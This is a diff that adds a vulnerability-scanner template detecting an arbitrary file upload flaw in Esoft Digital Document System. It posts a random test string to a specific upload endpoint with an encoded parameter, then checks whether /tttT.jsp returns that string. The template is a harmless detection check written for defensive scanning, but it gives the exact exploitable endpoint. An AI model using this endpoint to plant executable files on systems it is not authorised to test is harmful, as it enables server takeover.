@@ -1,0 +1,33 @@
+id: esoft-digital-document-system-arbitrary-file-upload
+info:
+  name: Esoft Digital Document System Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in Esoft Digital Document System.
+
+variables:
+  v1: '{{md5(rand_base(8))}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"
+    body: "test-{{v1}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/tttT.jsp"
+    matchers:
+      - type: word
+        words:
+          - "{{v1}}"
